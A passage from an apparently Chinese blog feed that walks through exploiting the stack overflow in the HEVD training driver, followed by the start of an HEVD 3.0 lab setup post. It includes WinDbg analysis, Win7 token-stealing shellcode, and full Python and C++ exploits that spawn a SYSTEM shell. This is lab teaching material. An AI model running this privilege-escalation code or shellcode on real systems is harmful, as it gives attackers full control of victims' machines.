class="number">2048</span>);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">"[+] Triggering Buffer Overflow in Stack\n"</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(KernelBuffer, UserBuffer, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说读入参数为0x222003时，就会走栈溢出漏洞的路径</p><h2><span id="plou-dong-li-yong">漏洞利用</span><a href="#plou-dong-li-yong" class="header-anchor">#</a></h2><h3><span id="ppayload">payload</span><a href="#ppayload" class="header-anchor">#</a></h3><p>从函数中可以看到KernelBuffer位于[ebp - 0x81C]处，也就是需要覆盖0x81c + 4 = 0x820个字节到ebp，最后修改ret地址为UserBuffer地址，执行用户态的shellcode，即可实现提权<br><code>payload = 'a'*0x820 + UserBufferAddress</code></p><h3><span id="pshellcode">shellcode</span><a href="#pshellcode" class="header-anchor">#</a></h3><p>HEVD官方使用的shellcode如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">TokenStealingPayloadWin7</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Importance of Kernel Recovery</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad                               ; Save registers state</span><br><span class="line"></span><br><span class="line">        ; Start of Token Stealing Stub</span><br><span class="line">        <span class="keyword">xor</span> eax, eax                         ; Set ZERO</span><br><span class="line">        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">                                             ; _KTHREAD is located at FS:[<span class="number">0x124</span>]</span><br><span class="line"></span><br><span class="line">        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.<span class="built_in">Process</span></span><br><span class="line"></span><br><span class="line">        mov ecx, eax                         ; Copy current <span class="built_in">process</span> _EPROCESS structure</span><br><span class="line"></span><br><span class="line">        mov edx, SYSTEM_PID                  ; WIN <span class="number">7</span> SP1 SYSTEM <span class="built_in">process</span> PID = <span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">        SearchSystemPID:</span><br><span class="line">            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">            sub eax, FLINK_OFFSET</span><br><span class="line">            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId</span><br><span class="line">            jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM <span class="built_in">process</span> nt!_EPROCESS.Token</span><br><span class="line">        mov [ecx + TOKEN_OFFSET], edx        ; Replace target <span class="built_in">process</span> nt!_EPROCESS.Token</span><br><span class="line">                                             ; with SYSTEM <span class="built_in">process</span> nt!_EPROCESS.Token</span><br><span class="line">        ; End of Token Stealing Stub</span><br><span class="line"></span><br><span class="line">        popad                                ; Restore registers state</span><br><span class="line"></span><br><span class="line">        ; Kernel Recovery Stub</span><br><span class="line">        <span class="keyword">xor</span> eax, eax                         ; Set NTSTATUS SUCCEESS</span><br><span class="line">        add esp, <span class="number">12</span>                          ; Fix the <span class="built_in">stack</span></span><br><span class="line">        pop ebp                              ; Restore saved EBP</span><br><span class="line">        ret <span class="number">8</span>                                ; Return cleanly</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>作用是：找到System进程的token，与exp进程的token进行替换</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">kd&gt;</span><span class="bash"> r fs</span></span><br><span class="line">fs=00000030</span><br><span class="line"><span class="meta">kd&gt;</span><span class="bash"> dd fs:[0x124]</span></span><br><span class="line">0030:00000124  83f8a380 00000000 83f8a380 00000100</span><br><span class="line">0030:00000134  9e0d0106 0001003f 00000000 00000000</span><br><span class="line">0030:00000144  00000000 00000000 ffff0ff0 00000400</span><br><span class="line">0030:00000154  00000000 00000000 00000000 00000000</span><br><span class="line">0030:00000164  00000000 00000000 00000000 00000000</span><br><span class="line">0030:00000174  00000000 00000000 00000000 00000000</span><br><span class="line">0030:00000184  00000000 00000000 00000000 00000000</span><br><span class="line">0030:00000194  00000000 00000000 83f19ae7 83e5cf64</span><br><span class="line"><span class="meta">kd&gt;</span><span class="bash"> !pcr</span></span><br><span class="line">KPCR for Processor 0 at 83f80c00:</span><br><span class="line">    Major 1 Minor 1</span><br><span class="line">	NtTib.ExceptionList: 83f7d0ac</span><br><span class="line">	    NtTib.StackBase: 00000000</span><br><span class="line">	   NtTib.StackLimit: 00000000</span><br><span class="line">	 NtTib.SubSystemTib: 801e4000</span><br><span class="line">	      NtTib.Version: 003b53a6</span><br><span class="line">	  NtTib.UserPointer: 00000001</span><br><span class="line">	      NtTib.SelfTib: 00000000</span><br><span class="line"></span><br><span class="line">	            SelfPcr: 83f80c00</span><br><span class="line">	               Prcb: 83f80d20</span><br><span class="line">	               Irql: 0000001f</span><br><span class="line">	                IRR: 00000000</span><br><span class="line">	                IDR: ffffffff</span><br><span class="line">	      InterruptMode: 00000000</span><br><span class="line">	                IDT: 80b95400</span><br><span class="line">	                GDT: 80b95000</span><br><span class="line">	                TSS: 801e4000</span><br><span class="line"></span><br><span class="line">	      CurrentThread: 83f8a380</span><br><span class="line">	         NextThread: 00000000</span><br><span class="line">	         IdleThread: 83f8a380</span><br><span class="line"></span><br><span class="line">	          DpcQueue:</span><br></pre></td></tr></table></figure><p>可以看到fs:[124]存放的是CurrentThread的地址，结构为KTHREAD</p><blockquote><p>nt!_KPCR结构<br>KPCR表示内核进程控制区域。它包含了每个CPU的信息，被内核和HAL所共享。系统有几个CPU，就有几个KPCR。<br>当前CPU的KPCR总是可以通过fs:[0]在x86系统上访问，x64系统上则通过gs:[0]。通用的内核函数诸如PsGetCurrentProcess()和KeGetCurrentThread()会利用FS/GS相对访问来从KPCR中获取信息。<br>Prcb字段包含了一个内嵌的KPRCB结构体，用于表示内核进程控制块。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">kd&gt;</span><span class="bash"> dt _KTHREAD 83f8a380</span></span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">   +0x010 CycleTime        : 0x000012e7`3b6f4958</span><br><span class="line">   +0x018 HighCycleTime    : 0x12e7</span><br><span class="line">   +0x020 QuantumTarget    : 0x00000008`f36dc08d</span><br><span class="line">   +0x028 InitialStack     : 0x83f7ded0 Void</span><br><span class="line">   +0x02c StackLimit       : 0x83f7b000 Void</span><br><span class="line">   +0x030 KernelStack      : 0x83f7dc1c Void</span><br><span class="line">   +0x034 ThreadLock       : 0</span><br><span class="line">   +0x038 WaitRegister     : _KWAIT_STATUS_REGISTER</span><br><span class="line">   +0x039 Running          : 0x1 ''</span><br><span class="line">   +0x03a Alerted          : [2]  ""</span><br><span class="line">   +0x03c KernelStackResident : 0y1</span><br><span class="line">   +0x03c ReadyTransition  : 0y0</span><br><span class="line">   +0x03c ProcessReadyQueue : 0y0</span><br><span class="line">   +0x03c WaitNext         : 0y0</span><br><span class="line">   +0x03c SystemAffinityActive : 0y0</span><br><span class="line">   +0x03c Alertable        : 0y0</span><br><span class="line">   +0x03c GdiFlushActive   : 0y0</span><br><span class="line">   +0x03c UserStackWalkActive : 0y0</span><br><span class="line">   +0x03c ApcInterruptRequest : 0y0</span><br><span class="line">   +0x03c ForceDeferSchedule : 0y0</span><br><span class="line">   +0x03c QuantumEndMigrate : 0y0</span><br><span class="line">   +0x03c UmsDirectedSwitchEnable : 0y0</span><br><span class="line">   +0x03c TimerActive      : 0y0</span><br><span class="line">   +0x03c SystemThread     : 0y1</span><br><span class="line">   +0x03c Reserved         : 0y000000000000000000 (0)</span><br><span class="line">   +0x03c MiscFlags        : 0n8193</span><br><span class="line">   +0x040 ApcState         : _KAPC_STATE</span><br><span class="line"><span class="meta">kd&gt;</span><span class="bash"> dt _KAPC_STATE</span></span><br><span class="line">ntdll!_KAPC_STATE</span><br><span class="line">   +0x000 ApcListHead      : [2] _LIST_ENTRY</span><br><span class="line">   +0x010 Process          : Ptr32 _KPROCESS</span><br><span class="line">   +0x014 KernelApcInProgress : UChar</span><br><span class="line">   +0x015 KernelApcPending : UChar</span><br><span class="line">   +0x016 UserApcPending   : UChar</span><br></pre></td></tr></table></figure><p>[KTHREAD + 0x50]是KTHREAD.ApcState.Process，结构为KPROCESS，KPROCESS是EPROCESS结构的第一个字段，因此可以索引到EPROCESS结构</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">kd&gt;</span><span class="bash"> dt _EPROCESS</span></span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x098 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x0a0 CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +0x0a8 ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +0x0b0 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x0b4 UniqueProcessId  : Ptr32 Void</span><br><span class="line">   +0x0b8 ActiveProcessLinks : _LIST_ENTRY</span><br></pre></td></tr></table></figure><p>EPROCESS的0xb8处是进程双向链表，遍历进程双向链表，可以找到System进程，System进程的EPRCESS的0xf8位置是token位置</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">kd&gt;</span><span class="bash"> dt _EPROCESS</span></span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x098 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x0a0 CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +0x0a8 ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +0x0b0 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x0b4 UniqueProcessId  : Ptr32 Void</span><br><span class="line">   +0x0b8 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x0c0 ProcessQuotaUsage : [2] Uint4B</span><br><span class="line">   +0x0c8 ProcessQuotaPeak : [2] Uint4B</span><br><span class="line">   +0x0d0 CommitCharge     : Uint4B</span><br><span class="line">   +0x0d4 QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">   +0x0d8 CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK</span><br><span class="line">   +0x0dc PeakVirtualSize  : Uint4B</span><br><span class="line">   +0x0e0 VirtualSize      : Uint4B</span><br><span class="line">   +0x0e4 SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x0ec DebugPort        : Ptr32 Void</span><br><span class="line">   +0x0f0 ExceptionPortData : Ptr32 Void</span><br><span class="line">   +0x0f0 ExceptionPortValue : Uint4B</span><br><span class="line">   +0x0f0 ExceptionPortState : Pos 0, 3 Bits</span><br><span class="line">   +0x0f4 ObjectTable      : Ptr32 _HANDLE_TABLE</span><br><span class="line">   +0x0f8 Token            : _EX_FAST_REF</span><br><span class="line"><span class="meta">kd&gt;</span><span class="bash"> dt _EX_FAST_REF</span></span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : Ptr32 Void</span><br><span class="line">   +0x000 RefCnt           : Pos 0, 3 Bits</span><br><span class="line">   +0x000 Value            : Uint4B</span><br></pre></td></tr></table></figure><p>token的低三位是引用计数，去除引用计数后的地址是实际token地址，我们直接看下System的token</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">kd&gt;</span><span class="bash"> !process 4 0 </span></span><br><span class="line">Searching for Process with Cid == 4</span><br><span class="line">PROCESS 85801a20  SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000</span><br><span class="line">    DirBase: 00185000  ObjectTable: 89201b60  HandleCount: 534.</span><br><span class="line">    Image: System</span><br><span class="line"></span><br><span class="line"><span class="meta">kd&gt;</span><span class="bash"> dt _EX_FAST_REF 85801a20+f8</span></span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0x892012c7 Void</span><br><span class="line">   +0x000 RefCnt           : 0y111</span><br><span class="line">   +0x000 Value            : 0x892012c7</span><br><span class="line"><span class="meta">kd&gt;</span><span class="bash"> !token 0x892012c7 &amp; 0xfffffff8</span></span><br><span class="line">_TOKEN 0xffffffff892012c0</span><br><span class="line">TS Session ID: 0</span><br><span class="line">User: S-1-5-18</span><br><span class="line">User Groups: </span><br><span class="line"> 00 S-1-5-32-544</span><br><span class="line">    Attributes - Default Enabled Owner </span><br><span class="line"> 01 S-1-1-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 02 S-1-5-11</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 03 S-1-16-16384</span><br><span class="line">    Attributes - GroupIntegrity GroupIntegrityEnabled </span><br><span class="line">Primary Group: S-1-5-18</span><br><span class="line">Privs: </span><br><span class="line"> 02 0x000000002 SeCreateTokenPrivilege            Attributes - </span><br><span class="line"> 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - </span><br><span class="line"> 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled Default </span><br><span class="line"> 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - </span><br><span class="line"> 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled Default </span><br><span class="line"> 08 0x000000008 SeSecurityPrivilege               Attributes - </span><br><span class="line"> 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - </span><br><span class="line"> 10 0x00000000a SeLoadDriverPrivilege             Attributes - </span><br><span class="line"> 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled Default </span><br><span class="line"> 12 0x00000000c SeSystemtimePrivilege             Attributes - </span><br><span class="line"> 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled Default </span><br><span class="line"> 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default </span><br><span class="line"> 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled Default </span><br><span class="line"> 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled Default </span><br><span class="line"> 17 0x000000011 SeBackupPrivilege                 Attributes - </span><br><span class="line"> 18 0x000000012 SeRestorePrivilege                Attributes - </span><br><span class="line"> 19 0x000000013 SeShutdownPrivilege               Attributes - </span><br><span class="line"> 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled Default </span><br><span class="line"> 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled Default </span><br><span class="line"> 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - </span><br><span class="line"> 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default </span><br><span class="line"> 25 0x000000019 SeUndockPrivilege                 Attributes - </span><br><span class="line"> 28 0x00000001c SeManageVolumePrivilege           Attributes - </span><br><span class="line"> 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled Default </span><br><span class="line"> 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default </span><br><span class="line"> 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - </span><br><span class="line"> 32 0x000000020 SeRelabelPrivilege                Attributes - </span><br><span class="line"> 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default </span><br><span class="line"> 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled Default </span><br><span class="line"> 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default</span><br></pre></td></tr></table></figure><h3><span id="ppython2-7-exp">python2.7 exp</span><a href="#ppython2-7-exp" class="header-anchor">#</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line">kernel32 = windll.kernel32</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_driver</span><span class="params">()</span>:</span></span><br><span class="line">    hevd = kernel32.CreateFileA(<span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>, </span><br><span class="line">                                <span class="number">0xC0000000</span>, <span class="comment"># 1100 0000 读取方式 READ / Write</span></span><br><span class="line">                                <span class="number">0</span>, <span class="comment"># 共享模式 No Sharing</span></span><br><span class="line">                                <span class="literal">None</span>, <span class="comment"># 安全属性 No Security, NULL</span></span><br><span class="line">                                <span class="number">0x3</span>, <span class="comment"># 0011 只读和隐藏属性</span></span><br><span class="line">                                <span class="number">0</span>, </span><br><span class="line">                                <span class="literal">None</span>) <span class="comment"># NULL</span></span><br><span class="line">    <span class="keyword">if</span>(hevd == <span class="number">-1</span> <span class="keyword">or</span> <span class="keyword">not</span> hevd ):</span><br><span class="line">        print(<span class="string">"[-] Failed to open hevd"</span>)</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[+] Sucessful open hevd"</span>)</span><br><span class="line">    <span class="keyword">return</span> hevd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(hevd)</span>:</span></span><br><span class="line">    shellcode = bytearray(</span><br><span class="line">    <span class="string">"\x60"</span>                            <span class="comment"># pushad</span></span><br><span class="line">    <span class="string">"\x31\xc0"</span>                        <span class="comment"># xor eax,eax</span></span><br><span class="line">    <span class="string">"\x64\x8b\x80\x24\x01\x00\x00"</span>    <span class="comment"># mov eax,[fs:eax+0x124]</span></span><br><span class="line">    <span class="string">"\x8b\x40\x50"</span>                    <span class="comment"># mov eax,[eax+0x50]</span></span><br><span class="line">    <span class="string">"\x89\xc1"</span>                        <span class="comment"># mov ecx,eax</span></span><br><span class="line">    <span class="string">"\xba\x04\x00\x00\x00"</span>            <span class="comment"># mov edx,0x4</span></span><br><span class="line">    <span class="string">"\x8b\x80\xb8\x00\x00\x00"</span>        <span class="comment"># mov eax,[eax+0xb8]</span></span><br><span class="line">    <span class="string">"\x2d\xb8\x00\x00\x00"</span>            <span class="comment"># sub eax,0xb8</span></span><br><span class="line">    <span class="string">"\x39\x90\xb4\x00\x00\x00"</span>        <span class="comment"># cmp [eax+0xb4],edx</span></span><br><span class="line">    <span class="string">"\x75\xed"</span>                        <span class="comment"># jnz 0x1a</span></span><br><span class="line">    <span class="string">"\x8b\x90\xf8\x00\x00\x00"</span>        <span class="comment"># mov edx,[eax+0xf8]</span></span><br><span class="line">    <span class="string">"\x89\x91\xf8\x00\x00\x00"</span>        <span class="comment"># mov [ecx+0xf8],edx</span></span><br><span class="line">    <span class="string">"\x61"</span>                            <span class="comment"># popad</span></span><br><span class="line">    <span class="string">"\x5d"</span></span><br><span class="line">    <span class="string">"\xc2\x08\x00"</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[*] Allocating shellcode character array..."</span>)</span><br><span class="line">    userbuffer_addr = (c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">    ptr = addressof(userbuffer_addr)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[*] Marking shellcode RWX..."</span>)</span><br><span class="line">    </span><br><span class="line">    result = kernel32.VirtualProtect(</span><br><span class="line">        userbuffer_addr,</span><br><span class="line">        c_int(len(shellcode)),</span><br><span class="line">        c_int(<span class="number">0x40</span>),</span><br><span class="line">        byref(c_ulong())</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result != <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"[+] Successfully marked shellcode RWX."</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Failed to mark shellcode RWX."</span>)</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    payload = struct.pack(<span class="string">"&lt;L"</span>,ptr)</span><br><span class="line"></span><br><span class="line">    buf = <span class="string">"A"</span> * <span class="number">2080</span></span><br><span class="line">    buf += payload</span><br><span class="line">    buf_length = len(buf)</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">"[*] Sending payload to driver..."</span>)</span><br><span class="line">    result = kernel32.DeviceIoControl(</span><br><span class="line">        hevd,</span><br><span class="line">        <span class="number">0x222003</span>,</span><br><span class="line">        buf,</span><br><span class="line">        buf_length,</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        byref(c_ulong()),</span><br><span class="line">        <span class="literal">None</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result != <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"[+] Payload sent."</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Unable to send payload to driver."</span>)</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">"[*] Spawning cmd shell with SYSTEM privs..."</span>)</span><br><span class="line">        Popen(</span><br><span class="line">            <span class="string">'start cmd'</span>,</span><br><span class="line">            shell=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[-] Failed to spawn cmd shell."</span>)</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    hevd = open_driver()</span><br><span class="line">    pwn(hevd)</span><br></pre></td></tr></table></figure><h3><span id="pc-exp-vs2017">c++ exp(vs2017)</span><a href="#pc-exp-vs2017" class="header-anchor">#</a></h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hevd = CreateFileA(<span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hevd == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		wprintf(<span class="string">L"[-] Failed to open hevd\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		wprintf(<span class="string">L"[+] Success to open hevd\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LPVOID Buffer = VirtualAlloc(<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">4096</span>,</span><br><span class="line">		MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">		PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> shellcode[] =</span><br><span class="line">		<span class="string">"\x60"</span>                            <span class="comment">// pushad</span></span><br><span class="line">		<span class="string">"\x31\xc0"</span>                        <span class="comment">// xor eax, eax</span></span><br><span class="line">		<span class="string">"\x64\x8b\x80\x24\x01\x00\x00"</span>    <span class="comment">// mov eax, [fs:eax + 0x124]</span></span><br><span class="line">		<span class="string">"\x8b\x40\x50"</span>                    <span class="comment">// mov eax, [eax + 0x50]</span></span><br><span class="line">		<span class="string">"\x89\xc1"</span>                        <span class="comment">// mov ecx, eax</span></span><br><span class="line">		<span class="string">"\xba\x04\x00\x00\x00"</span>            <span class="comment">// mov edx, 0x4</span></span><br><span class="line">		<span class="string">"\x8b\x80\xb8\x00\x00\x00"</span>        <span class="comment">// mov eax, [eax + 0xb8]</span></span><br><span class="line">		<span class="string">"\x2d\xb8\x00\x00\x00"</span>            <span class="comment">// sub eax, 0xb8</span></span><br><span class="line">		<span class="string">"\x39\x90\xb4\x00\x00\x00"</span>        <span class="comment">// cmp[eax + 0xb4], edx</span></span><br><span class="line">		<span class="string">"\x75\xed"</span>                        <span class="comment">// jnz 0x1a</span></span><br><span class="line">		<span class="string">"\x8b\x90\xf8\x00\x00\x00"</span>        <span class="comment">// mov edx, [eax + 0xf8]</span></span><br><span class="line">		<span class="string">"\x89\x91\xf8\x00\x00\x00"</span>        <span class="comment">// mov[ecx + 0xf8], edx</span></span><br><span class="line">		<span class="string">"\x61"</span>                            <span class="comment">// popad</span></span><br><span class="line">		<span class="string">"\x5d"</span></span><br><span class="line">		<span class="string">"\xc2\x08\x00"</span>;</span><br><span class="line"></span><br><span class="line">	RtlCopyMemory(Buffer, shellcode, <span class="number">61</span>);</span><br><span class="line">	DWORD *ret = (DWORD*)((<span class="keyword">int</span>)Buffer + <span class="number">2080</span>);</span><br><span class="line">	*ret = (DWORD)Buffer;</span><br><span class="line">	DWORD byteret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> result = DeviceIoControl(hevd,</span><br><span class="line">		<span class="number">0x222003</span>,</span><br><span class="line">		Buffer,</span><br><span class="line">		<span class="number">2080</span> + <span class="number">4</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;byteret,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (result == <span class="number">0</span>) &#123;</span><br><span class="line">		wprintf(<span class="string">L"[-] Failed send payload\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		wprintf(<span class="string">L"[+] Success send payload\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h2><ul><li><a href="https://bbs.pediy.com/thread-252775.htm">HEVD内核漏洞之栈溢出</a></li><li><a href="https://50u1w4y.github.io/site/HEVD/stackoverflow/">HEVD栈溢出</a></li><li><a href="https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/">Windows Kernel Exploitation Tutorial Part 2: Stack Overflow</a><a href="https://rootkits.xyz/blog/2017/09/kernel-write-what-where/">https://rootkits.xyz/blog/2017/09/kernel-write-what-where/</a>)</li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>HEVD</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>HEVD</tag>
      </tags>
  </entry>
  <entry>
    <title>HEVD3.0环境搭建</title>
    <url>/46ae8303.html</url>
    <content><![CDATA[<h2><span id="pji-ben-huan-jing">基本环境</span><a href="#pji-ben-huan-jing" class="header-anchor">#</a></h2><p>漏洞驱动：<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/">HEVD 3.0</a><br>宿主机(Host)：Win10<br>被调试机(Guest)：VMware16.0 Win7sp1<br>调试工具：Windows Preview<br>驱动加载工具：<a href="https://www.osronline.com/article.cfm%5earticle=157.htm">OSRLoader</a></p><a id="more"></a><h2><span id="pbian-yi-hevd">编译HEVD</span><a href="#pbian-yi-hevd" class="header-anchor">#</a></h2><p>Vistual Studio 2017 + <a href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive">WSDK 1803</a> + <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk">WDK 1803</a></p><h3><span id="pbian-yi-driver">编译Driver</span><a href="#pbian-yi-driver" class="header-anchor">#</a></h3><p>打开项目直接编译即可，可能会出现问题：VS2017 -error LNK1104: 无法打开文件“msvcprtd.lib”或者其他找不到，具体解决方案如下<br><a href="https://blog.csdn.net/u012308586/article/details/89309495">https://blog.csdn.net/u012308586/article/details/89309495</a></p><h3><span id="pbian-yi-exploit">编译Exploit</span><a href="#pbian-yi-exploit" class="header-anchor">#</a></h3><p>打开项目直接编译，可能会出现无法签名的错误，hevd.cer。此时加入hevd的签名cer即可<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-25-03-upload_50fc02eb10c3f799830c93a1383f46fc.png" alt="img"></p><h3><span id="pce-shi-qu-dong-ke-yong-xing">测试驱动可用性</span><a href="#pce-shi-qu-dong-ke-yong-xing" class="header-anchor">#</a></h3><p>在win7sp1下使用OSRLoader加载驱动，使用官方Exploit进行提权测试<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-25-03-upload_1010319126e998c2433e92b85db2a774.png" alt="img"></p><h2><span id="pvmware-shuang-ji-diao-shi-huan-jing-da-jian">VMware双机调试环境搭建</span><a href="#pvmware-shuang-ji-diao-shi-huan-jing-da-jian" class="header-anchor">#</a></h2><h3><span id="pjian-li-tong-xin">建立通信</span><a href="#pjian-li-tong-xin" 